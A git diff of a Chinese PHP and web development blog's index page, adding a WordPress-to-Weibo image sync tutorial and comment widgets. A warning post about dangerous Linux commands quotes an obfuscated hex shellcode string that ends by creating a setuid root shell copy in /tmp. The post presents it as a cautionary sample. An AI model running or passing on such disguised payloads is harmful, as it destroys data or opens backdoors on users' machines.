@@ -182,7 +182,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/2014/08/13/e7-94-a8mysql-unbuffered-query-e5-87-bd-e6-95-b0-e5-8f-96-e5-a4-a7-e6-95-b0-e6-8d-ae/">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/wordpress-e6-96-87-e7-ab-a0-e5-b8-a6-e5-9b-be-e7-89-87-e5-90-8c-e6-ad-a5-e5-88-b0-e6-96-b0-e6-b5-aa-e5-be-ae-e5-8d-9a/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/avatar.jpg">
@@ -196,7 +196,148 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2014/08/13/e7-94-a8mysql-unbuffered-query-e5-87-bd-e6-95-b0-e5-8f-96-e5-a4-a7-e6-95-b0-e6-8d-ae/" class="post-title-link" itemprop="url">用mysql_unbuffered_query函数取大数据</a>
+            <a href="/posts/wordpress-e6-96-87-e7-ab-a0-e5-b8-a6-e5-9b-be-e7-89-87-e5-90-8c-e6-ad-a5-e5-88-b0-e6-96-b0-e6-b5-aa-e5-be-ae-e5-8d-9a/" class="post-title-link" itemprop="url">wordpress文章带图片同步到新浪微博</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2014-08-18 14:13:59" itemprop="dateCreated datePublished" datetime="2014-08-18T14:13:59+08:00">2014-08-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-12-04 22:46:27" itemprop="dateModified" datetime="2019-12-04T22:46:27+08:00">2019-12-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PHP/" itemprop="url" rel="index">
+                    <span itemprop="name">PHP</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><a href="http://storage.veitor.net/uploads/2014/08/1392117921664.jpg" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/08/1392117921664.jpg" alt="1392117921664"></a> 今天终于能把个人博客上的文章及文中图片一起同步到新浪微博了，在此发文纪念一下，并带图同步到我的微博测试。并且与大家一起分享一下经验，想必也有很多朋友在同步到微博的时候，遇到了传图的问题。 此前我都是使用多说评论框的接口同步到微博的，但为了能拥有自己的微博来源小尾巴，就自己开发一个。 首先你当然得有微博开放平台的帐号，并申请通过了网站应用审核。其次就是调用API接口了。 新浪微博有个高级接口，能发布一条微博并指定上传图片的url，这个接口由于需要申请使用，比较麻烦，还不如自己用另一个接口来实现锻炼一下自己。这里我使用的是<a href="https://upload.api.weibo.com/2/statuses/upload.json" target="_blank" rel="noopener">https://upload.api.weibo.com/2/statuses/upload.json</a> 这个接口（<a href="http://open.weibo.com/wiki/2/statuses/upload" target="_blank" rel="noopener">详情见这</a>）</p>
+<p>必选</p>
+<p>类型及范围</p>
+<p>说明</p>
+<p>source</p>
+<p>false</p>
+<p>string</p>
+<p>采用OAuth授权方式不需要此参数，其他授权方式为必填参数，数值为应用的AppKey。</p>
+<p>access_token</p>
+<p>false</p>
+<p>string</p>
+<p>采用OAuth授权方式为必填参数，其他授权方式不需要此参数，OAuth授权后获得。</p>
+<p>status</p>
+<p>true</p>
+<p>string</p>
+<p>要发布的微博文本内容，必须做URLencode，内容不超过140个汉字。</p>
+<p>visible</p>
+<p>false</p>
+<p>int</p>
+<p>微博的可见性，0：所有人能看，1：仅自己可见，2：密友可见，3：指定分组可见，默认为0。</p>
+<p>list_id</p>
+<p>false</p>
+<p>string</p>
+<p>微博的保护投递指定分组ID，只有当visible参数为3时生效且必选。</p>
+<p>pic</p>
+<p>true</p>
+<p>binary</p>
+<p>要上传的图片，仅支持JPEG、GIF、PNG格式，图片大小小于5M。</p>
+<p>lat</p>
+<p>false</p>
+<p>float</p>
+<p>纬度，有效范围：-90.0到+90.0，+表示北纬，默认为0.0。</p>
+<p>long</p>
+<p>false</p>
+<p>float</p>
+<p>经度，有效范围：-180.0到+180.0，+表示东经，默认为0.0。</p>
+<p>annotations</p>
+<p>false</p>
+<p>string</p>
+<p>元数据，主要是为了方便第三方应用记录一些适合于自己使用的信息，每条微博可以包含一个或者多个元数据，必须以json字串的形式提交，字串长度不超过512个字符，具体内容可以自定。</p>
+<p>rip</p>
+<p>false</p>
+<p>string</p>
+<p>开发者上报的操作用户真实IP，形如：211.156.0.1。</p>
+<p>文档规定的参数有以上这些，我只用到了source、status和pic三个参数就行了，当然你可以获得access_token来代替source（本文使用source讲解）。 上传图片等流媒体文件需要使用<strong>multipart/form-data</strong>编码方式，这和我们平常使用的表单上传文件类似。提交时会向服务器端发出这样的数据（如下代码，已经去除部分不相关的头信息）。</p>
+<p>POST / HTTP/1.1<br>Content-Type:application/x-www-form-urlencoded<br>Accept-Encoding: gzip, deflate<br>Host: weibo.com<br>Content-Length: 21<br>Connection: Keep-Alive<br>Cache-Control: no-cache<br>txt1=hello&amp;txt2=world</p>
+<p>对于普通的HTML Form POST请求，它会在头信息里使用Content-Length注明内容长度。头信息每行一条，空行之后便是Body，即“内容”（entity）。它的Content-Type是application/x-www-form-urlencoded，这意味着消息内容会经过URL编码，就像在GET请 求时URL里的QueryString那样。txt1=hello&amp;txt2=world 最早的HTTP POST是不支持文件上传的，给编程开发带来很多问题。但是在1995年，ietf出台了rfc1867,也就是《RFC 1867 -Form-based File Upload in HTML》，用以支持文件上传。所以Content-Type的类型扩充了multipart/form-data用以支持向服务器发送二进制数据。因此发送post请求时候，表单 属性enctype共有二个值可选，这个属性管理的是表单的MIME编码： ①application/x-www-form-urlencoded(默认值) ②multipart/form-data 其实form表单在你不写enctype属性时，也默认为其添加了enctype属性值，默认值是enctype=”application/x- www-form-urlencoded”. 通过form表单提交文件操作如下：</p>
+<form method="post"action="http://w.sohu.com/t2/upload.do" enctype=”multipart/form-data”>
+<inputtype="text" name="desc">
+<inputtype="file" name="pic">
+</form>
+
+<p>浏览器会发送以下数据：</p>
+<p>POST /t2/upload.do HTTP/1.1<br>User-Agent: SOHUWapRebot<br>Accept-Language: zh-cn,zh;q=0.5<br>Accept-Charset: GBK,utf-8;q=0.7,*;q=0.7<br>Connection: keep-alive<br>Content-Length: 60408<br>Content-Type:multipart/form-data; boundary=ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXC<br>Host: weibo.com<br>–ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXC<br>Content-Disposition: form-data;name=”desc”<br>Content-Type: text/plain; charset=UTF-8<br>Content-Transfer-Encoding: 8bit<br>–ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXC<br>Content-Disposition: form-data;name=”pic”; filename=”photo.jpg”<br>Content-Type: application/octet-stream<br>Content-Transfer-Encoding: binary<br>[图片二进制数据]<br>–ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXC–</p>
+<p>先分析一下上面的内容，<strong>然后我们来根据这内容来构造发送的数据。</strong> 第7行指定发送编码是multipart/form-data，并且指定boundary值为“ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXC”，这个值可以随机产生，不难理解，boundary就是来分隔数据的。并且每段分隔时boundary值前面需要加“–”，最后结尾处在boundary值的前后加”–”（看上面代码最后一行）。 每段boundary之内，先是数据描述，再是数据的主体。 <a href="http://storage.veitor.net/uploads/2014/08/QQ截图20140818215404.jpg" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/08/QQ%E6%88%AA%E5%9B%BE20140818215404.jpg" alt="QQ截图20140818215404"></a>   <strong>现在放上我构造的代码，自己琢磨一下就明白了：</strong></p>
+<p>function post_to_sina_weibo($post_ID) {<br>  if( wp_is_post_revision($post_ID) ) return;<br>    $get_post_info = get_post($post_ID);<br>    //发布的文章内容，带所有标签格式<br>    $get_post_centent = get_post($post_ID)-&gt;post_content;<br>    //用正则表达式抠图<br>    preg_match_all(‘/&lt;img.<em>?(?: |\\t|\\r|\\n)?src=[\‘“]?(.+?)[\‘“]?(?:(?: |\\t|\\r|\\n)+.</em>?)?&gt;/sim’, $get_post_centent, $strResult, PREG_PATTERN_ORDER);<br>   if(count($strResult[1]) &gt; 0)<br>        $imgUrl = $strResult[1][0];//获得第一张图url地址<br>   else<br>        $imgUrl = null;<br>    //去掉文章内的html编码的空格、换行、tab等符号<br>    $get_post_centent = str_replace(“\t”, “ “, str_replace(“\n”, “ “, str_replace(“&nbsp;”, “ “, $get_post_centent)));<br>    //获取文章标题<br>    $get_post_title = get_post($post_ID)-&gt;post_title;<br>    if ( $get_post_info-&gt;post_status == ‘publish’ &amp;&amp; $_POST[‘original_post_status’] != ‘publish’ ) {<br>    //使用wordpress内置request请求类，在wp_includes/wp_http.php里<br>    $request = new WP_Http;<br>    //微博文字，格式为“【文章标题】文章摘要132字，全文地址：XXXX”<br>    $status = ‘【’ . strip_tags( $get_post_title ) . ‘】 ‘ . mb_strimwidth(strip_tags( apply_filters(‘the_content’, $get_post_centent)),0, 132,’…’) . ‘ 全文地址:’ . get_permalink($post_ID) ;<br>    //如果没图片则请求这个api<br>    $api_url = ‘<a href="https://api.weibo.com/2/statuses/update.json&#39;" target="_blank" rel="noopener">https://api.weibo.com/2/statuses/update.json&#39;</a>;<br>    //body内容，source参数为你的appkey，详情见wordpress的WP_http类<br>    $body = array( ‘status’ =&gt; $status, ‘source’=&gt;’706960568’);<br>    //请将xxxxxxxxx替换成你的，xxxxxxxxxx为“用户名：密码”的base64编码<br>    $headers = array( ‘Authorization’ =&gt; ‘Basic ‘ . ‘xxxxxxxxxxxxxxxx’ );<br>    //重要步骤，如果文章有图片则构造发送数据包<br>    if($imgUrl!==null)<br>    {<br>        $body[‘pic’] = $imgUrl;<br>        uksort($body, ‘strcmp’);<br>        $str_b=uniqid(‘——————‘);<br>        $str_m=’–’.$str_b;<br>        $str_e=$str_m. ‘–’;<br>        $tmpbody=’’;<br>        //对参数遍历，进行构造内容，仔细阅读，你会发现和上面讲的类似<br>        foreach($body as $k=&gt;$v){<br>            if($k==’pic’){<br>                $img_c=file_get_contents($imgUrl);<br>                $url_a=explode(‘?’, basename($imgUrl));<br>                $img_n=$url_a[0];<br>                $tmpbody.=$str_m.”\r\n”;<br>                $tmpbody.=’Content-Disposition: form-data; name=”‘.$k.’”; filename=”‘.$img_n.’”‘.”\r\n”;<br>                $tmpbody.=”Content-Type: image/unknown\r\n\r\n”;<br>                $tmpbody.=$img_c.”\r\n”;<br>            }else{<br>                $tmpbody.=$str_m.”\r\n”;<br>                $tmpbody.=’Content-Disposition: form-data; name=”‘.$k.”\“\r\n\r\n”;<br>                $tmpbody.=$v.”\r\n”;<br>            }<br>        }<br>        $tmpbody.=$str_e;<br>        $body = $tmpbody;<br>        //图片处理结束，使用uploade API<br>        $api_url = ‘<a href="https://upload.api.weibo.com/2/statuses/upload.json&#39;" target="_blank" rel="noopener">https://upload.api.weibo.com/2/statuses/upload.json&#39;</a>;<br>        //设置Content-Type编码为multipart/form-data<br>        $headers[‘Content-Type’] = ‘multipart/form-data; boundary=’.$str_b;<br>    }<br>    //请求接口发送数据，详见wordpress自带的WP_http类<br>    $result = $request-&gt;post( $api_url , array( ‘body’ =&gt; $body, ‘headers’ =&gt; $headers ) );<br>}<br>//最后将这个函数挂到pulish_post钩子上，发表文章后就会触发这个函数<br>add_action(‘publish_post’, ‘post_to_sina_weibo’, 0);</p>
+<p>  这段代码理论上来说你可以拿去直接用了，只需按注释上说的修改几个参数为自己的就行了。 这也是我研究琢磨出来的，有任何疑问可以一起探讨。</p>
+
+<div id="gitalk-container"></div>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+		<script>
+		var gitalkConfig = {"clientID":"8fffdd9e888794e7cafb","clientSecret":{"gitalk-github-client-secret":null},"repo":"veitor.github.io","owner":"Veitor","admin":["Veitor"],"distractionFreeMode":false};
+	    gitalkConfig.id = md5(location.pathname);
+		var gitalk = new Gitalk(gitalkConfig);
+	    gitalk.render("gitalk-container");
+	    </script>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/e7-94-a8mysql-unbuffered-query-e5-87-bd-e6-95-b0-e5-8f-96-e5-a4-a7-e6-95-b0-e6-8d-ae/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpg">
+      <meta itemprop="name" content="Veitor">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Veitor的技术点滴">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/e7-94-a8mysql-unbuffered-query-e5-87-bd-e6-95-b0-e5-8f-96-e5-a4-a7-e6-95-b0-e6-8d-ae/" class="post-title-link" itemprop="url">用mysql_unbuffered_query函数取大数据</a>
         </h2>
 
         <div class="post-meta">
@@ -213,7 +354,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-03 22:56:03" itemprop="dateModified" datetime="2019-12-03T22:56:03+08:00">2019-12-03</time>
+                <time title="修改时间：2019-12-04 22:46:27" itemprop="dateModified" datetime="2019-12-04T22:46:27+08:00">2019-12-04</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -242,6 +383,15 @@
 <p>   $link = mysql_con nect(‘localhost’,’root’,’root’);<br>   mysql_select_ db(‘phpcms’);<br>   $sql = “SEL ECT * FROM `phpcms_content`“;<br>   //$result = mysql_unbuffered_query($sql,$link);<br>   $result = mysql_query($sql,$link);<br>   while ($row = mysql_fe tch_array($result, MYSQL_NUM)) {<br>      printf (“ID: %s Name: %s”, $row[0], $row[1]);<br>   }<br>   mysql_data_seek($result,0);<br>   echo “<br/>“;<br>   while ($row = mysql_fetch_array($result, MYSQL_NUM)) {<br>      printf (“ID: %s Name: %s”, $row[0], $row[1]);<br>   }<br>    mysql_free_result($result);</p>
 <p>你会发现使用mysql_query会输出两次，而mysql_unbuffered_query只输出一次，说明使用mysql_query查询结果必定被缓存了，而使用mysql_unbuffered_query则边进行查询边给出结果。 最后再说明，使用mysql_unbuffered_query的话，不能使用mysql_num_rows()和mysql_data_seek()这也正因为它的特性方式决定了这样。还有比较重要的一点，如果你只是单单获取大数据量使用这个函数可以，<strong>但是，如果你在取得大数据的时候，使用while($row = mysql_fetch_assoc($result))方式进行执行新的sql语句的话，会出错。手册上也写明了，在执行一条心的sql之前，要提取所有未缓存的sql查询所产生的行。</strong>所以只使用mysql_unbuffered_query取数据可以，但期间还要执行其他sql就不行了。 以上只是我对这个函数的初步认识，如果理解有误，也希望能指正交流。</p>
 
+<div id="gitalk-container"></div>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+		<script>
+		var gitalkConfig = {"clientID":"8fffdd9e888794e7cafb","clientSecret":{"gitalk-github-client-secret":null},"repo":"veitor.github.io","owner":"Veitor","admin":["Veitor"],"distractionFreeMode":false};
+	    gitalkConfig.id = md5(location.pathname);
+		var gitalk = new Gitalk(gitalkConfig);
+	    gitalk.render("gitalk-container");
+	    </script>
       
     </div>
 
@@ -260,7 +410,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/2014/08/04/php-self-script-name-script-filename-path-info-request-uri-e7-9a-84-e5-8c-ba-e5-88-ab/">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/php-self-script-name-script-filename-path-info-request-uri-e7-9a-84-e5-8c-ba-e5-88-ab/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/avatar.jpg">
@@ -274,7 +424,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2014/08/04/php-self-script-name-script-filename-path-info-request-uri-e7-9a-84-e5-8c-ba-e5-88-ab/" class="post-title-link" itemprop="url">PHP_SELF，SCRIPT_NAME，SCRIPT_FILENAME，PATH_INFO，REQUEST_URI的区别</a>
+            <a href="/posts/php-self-script-name-script-filename-path-info-request-uri-e7-9a-84-e5-8c-ba-e5-88-ab/" class="post-title-link" itemprop="url">PHP_SELF，SCRIPT_NAME，SCRIPT_FILENAME，PATH_INFO，REQUEST_URI的区别</a>
         </h2>
 
         <div class="post-meta">
@@ -291,7 +441,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-03 22:56:03" itemprop="dateModified" datetime="2019-12-03T22:56:03+08:00">2019-12-03</time>
+                <time title="修改时间：2019-12-04 22:46:27" itemprop="dateModified" datetime="2019-12-04T22:46:27+08:00">2019-12-04</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -374,6 +524,15 @@
 </ul>
 <pre><code>那么`REQUEST_URI`为**/test/test.php**，`SCRIPT_NAME`为**/test/test2.php**。</code></pre><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://tools.ietf.org/html/draft-robinson-www-interface-00" target="_blank" rel="noopener">http://tools.ietf.org/html/draft-robinson-www-interface-00</a> <a href="http://stackoverflow.com/questions/279966/php-self-vs-path-info-vs-script-name-vs-request-uri" target="_blank" rel="noopener">http://stackoverflow.com/questions/279966/php-self-vs-path-info-vs-script-name-vs-request-uri</a> <a href="http://ca.php.net/manual/en/reserved.variables.server.php" target="_blank" rel="noopener">http://ca.php.net/manual/en/reserved.variables.server.php</a> (完)</p>
 
+<div id="gitalk-container"></div>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+		<script>
+		var gitalkConfig = {"clientID":"8fffdd9e888794e7cafb","clientSecret":{"gitalk-github-client-secret":null},"repo":"veitor.github.io","owner":"Veitor","admin":["Veitor"],"distractionFreeMode":false};
+	    gitalkConfig.id = md5(location.pathname);
+		var gitalk = new Gitalk(gitalkConfig);
+	    gitalk.render("gitalk-container");
+	    </script>
       
     </div>
 
@@ -392,7 +551,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/2014/07/29/e4-b8-a4-e4-b8-aa-e5-ae-9c-e4-ba-8e-e7-bb-9f-e4-b8-80web-e7-9a-84-e6-96-b9-e6-a1-88-e5-93-8d-e5-ba-94-e5-bc-8f-e4-b8-8e-e8-87-aa-e9-80-82-e5-ba-94/">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/e4-b8-a4-e4-b8-aa-e5-ae-9c-e4-ba-8e-e7-bb-9f-e4-b8-80web-e7-9a-84-e6-96-b9-e6-a1-88-e5-93-8d-e5-ba-94-e5-bc-8f-e4-b8-8e-e8-87-aa-e9-80-82-e5-ba-94/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/avatar.jpg">
@@ -406,7 +565,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2014/07/29/e4-b8-a4-e4-b8-aa-e5-ae-9c-e4-ba-8e-e7-bb-9f-e4-b8-80web-e7-9a-84-e6-96-b9-e6-a1-88-e5-93-8d-e5-ba-94-e5-bc-8f-e4-b8-8e-e8-87-aa-e9-80-82-e5-ba-94/" class="post-title-link" itemprop="url">两个宜于『统一Web』的方案：响应式与自适应</a>
+            <a href="/posts/e4-b8-a4-e4-b8-aa-e5-ae-9c-e4-ba-8e-e7-bb-9f-e4-b8-80web-e7-9a-84-e6-96-b9-e6-a1-88-e5-93-8d-e5-ba-94-e5-bc-8f-e4-b8-8e-e8-87-aa-e9-80-82-e5-ba-94/" class="post-title-link" itemprop="url">两个宜于『统一Web』的方案：响应式与自适应</a>
         </h2>
 
         <div class="post-meta">
@@ -423,7 +582,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-03 22:56:03" itemprop="dateModified" datetime="2019-12-03T22:56:03+08:00">2019-12-03</time>
+                <time title="修改时间：2019-12-04 22:46:27" itemprop="dateModified" datetime="2019-12-04T22:46:27+08:00">2019-12-04</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -453,6 +612,15 @@
 <h2 id="客户端自适应"><a href="#客户端自适应" class="headerlink" title="客户端自适应"></a>客户端自适应</h2><p>客户端自适应秉承着『为定制的设备 内容传达响应式设计用户体验』的原则。它采用JavaScript丰富站点的功能和独特性。比如，自适应站点只为Retina显示器（比如新款iPad）提供Retina质量的图片，而标准精度显示器接收低质量图片。 自适应设计有两种方案：一种是在客户端生效，在用户的浏览器上；另一种是由Web服务器负荷来检测设备类型并加载正确模板。客户端自适应类型的网站 案例包括个性T恤Threadless和奢侈品闪购ideeli。自适应模板方案的优势在于其复用HTML和JavaScript的能力，简化了项目管理 和测试的更迭。 客户端响应方案意味着你不必完全重构网站。相反你可以基于已有内容布局移动响应。对于专家级开发者而言，这种方案也可以让你针对指定设备或屏幕分辨 率。例如，对Mobify的大多在线时尚零售客户而言，95%的移动端流量来自iPhone。客户端自适应意味着他们可以专门针对苹果智能手机进行优化。 与响应式设计不同，自适应模板确保客户端设备只加载所需资源。因为对设备和特性的检测已经转移到了移动设备自身，类似Akamai和Edgecast的内容分发网络可以在不影响用户体验的情况下使用他们大部分的缓存功能。 客户端自适应比起响应式设计而言有着更高的壁垒。开发者用这项技术需要熟练掌握JavaScript，也依托于网站现有的模板为基础。最后，因为客户端自适应作为现有底层代码上的覆盖物，你需要在网站迁移时让它们作为一个整体。</p>
 <h2 id="服务器端自适应"><a href="#服务器端自适应" class="headerlink" title="服务器端自适应"></a>服务器端自适应</h2><p>依赖于服务器插件和自定义用户代理检测器我们也可以通过多种途径得到服务器端自适应方案。使用服务器端自适应的网站包括Etsy，One Kings Lane和OnlineShoes.com。 为什么要选择服务器端自适应？它通常针对每个设备提供独特的模板，允许更多的定制。并且这种方案把设备检测逻辑块放在服务器上，使得小型移动页面加载得更快。除此之外，对于像Magneto这种常见的CMS和电子商务系统来说，还有多种多样可用的服务器端插件。 这种方案不适用于小心脏——通常需要你大幅度改变后端系统，实施起来将会是冗长（和昂贵）的。管理多种模板需要有持续不断的维护成本。最后，当服务 器过载时这种方案还会带来性能问题。当服务器上加载移动用户代理检测器的时候，需要关掉许多部署在CDN上的缓存机制，像Akamai一样，这将导致移动 端和桌面访客的用户体验速率降低。 当然，许多公司仍然在跟响应的基本要领角力，显然还没有准备好面对重口味的自适应。然而，随着竞争的加剧和移动通信流量的上涨，越来越多的团队将在所有三个方法上浅尝辄止，（最终）择出一个最适合他们用户的方案。</p>
 
+<div id="gitalk-container"></div>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+		<script>
+		var gitalkConfig = {"clientID":"8fffdd9e888794e7cafb","clientSecret":{"gitalk-github-client-secret":null},"repo":"veitor.github.io","owner":"Veitor","admin":["Veitor"],"distractionFreeMode":false};
+	    gitalkConfig.id = md5(location.pathname);
+		var gitalk = new Gitalk(gitalkConfig);
+	    gitalk.render("gitalk-container");
+	    </script>
       
     </div>
 
@@ -471,7 +639,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/2014/07/16/e6-b0-b8-e8-bf-9c-e4-b8-8d-e8-a6-81-e5-9c-a8-linux-e6-89-a7-e8-a1-8c-e7-9a-84-10-e4-b8-aa-e6-9c-80-e5-8d-b1-e9-99-a9-e7-9a-84-e5-91-bd-e4-bb-a4/">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/e6-b0-b8-e8-bf-9c-e4-b8-8d-e8-a6-81-e5-9c-a8-linux-e6-89-a7-e8-a1-8c-e7-9a-84-10-e4-b8-aa-e6-9c-80-e5-8d-b1-e9-99-a9-e7-9a-84-e5-91-bd-e4-bb-a4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/avatar.jpg">
@@ -485,7 +653,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2014/07/16/e6-b0-b8-e8-bf-9c-e4-b8-8d-e8-a6-81-e5-9c-a8-linux-e6-89-a7-e8-a1-8c-e7-9a-84-10-e4-b8-aa-e6-9c-80-e5-8d-b1-e9-99-a9-e7-9a-84-e5-91-bd-e4-bb-a4/" class="post-title-link" itemprop="url">永远不要在 Linux 执行的 10 个最危险的命令</a>
+            <a href="/posts/e6-b0-b8-e8-bf-9c-e4-b8-8d-e8-a6-81-e5-9c-a8-linux-e6-89-a7-e8-a1-8c-e7-9a-84-10-e4-b8-aa-e6-9c-80-e5-8d-b1-e9-99-a9-e7-9a-84-e5-91-bd-e4-bb-a4/" class="post-title-link" itemprop="url">永远不要在 Linux 执行的 10 个最危险的命令</a>
         </h2>
 
         <div class="post-meta">
@@ -502,7 +670,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-03 22:56:03" itemprop="dateModified" datetime="2019-12-03T22:56:03+08:00">2019-12-03</time>
+                <time title="修改时间：2019-12-04 22:46:27" itemprop="dateModified" datetime="2019-12-04T22:46:27+08:00">2019-12-04</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -540,6 +708,15 @@
 <p>char esp[] __attribute__ ((section(“.text”))) /* e.s.prelease */= “\xeb\x3e\x5b\x31\xc0<br>\x50\x54\x5a\x83\xec\x64\x68″“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″“<br>\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″“\x56\x04\xf7\x56\x08\xf7\x56<br>\x0c\x83\xc4\x74\x56″“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″“\xc0<br>\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″“\x6e\x2f\x73\x68\x00\x2d\x63<br>\x00″“cp -p /bin/sh /tmp/.beyond; chmod 4755/tmp/.beyond;”;</p>
 <p>注意: 不要在你的或你的同学或学校的电脑里的Linux终端或Shell执行以上的任何一个命令。如果你想测试它们，请在虚拟机上运行。任何不和谐或数据丢失，由于运行上面的命令导致你的系统崩溃，文章作者和Tecmint概不负责。（译注：译者和转载网站也不负责~！）</p>
 
+<div id="gitalk-container"></div>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+		<script>
+		var gitalkConfig = {"clientID":"8fffdd9e888794e7cafb","clientSecret":{"gitalk-github-client-secret":null},"repo":"veitor.github.io","owner":"Veitor","admin":["Veitor"],"distractionFreeMode":false};
+	    gitalkConfig.id = md5(location.pathname);
+		var gitalk = new Gitalk(gitalkConfig);
+	    gitalk.render("gitalk-container");
+	    </script>
       
     </div>
 
@@ -558,7 +735,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/2014/07/16/url-e7-9b-b8-e4-bc-bc-e5-ba-a6-e8-ae-a1-e7-ae-97-e7-9a-84-e6-80-9d-e8-80-83-2/">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/url-e7-9b-b8-e4-bc-bc-e5-ba-a6-e8-ae-a1-e7-ae-97-e7-9a-84-e6-80-9d-e8-80-83-2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/avatar.jpg">
@@ -572,7 +749,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2014/07/16/url-e7-9b-b8-e4-bc-bc-e5-ba-a6-e8-ae-a1-e7-ae-97-e7-9a-84-e6-80-9d-e8-80-83-2/" class="post-title-link" itemprop="url">URL相似度计算的思考</a>
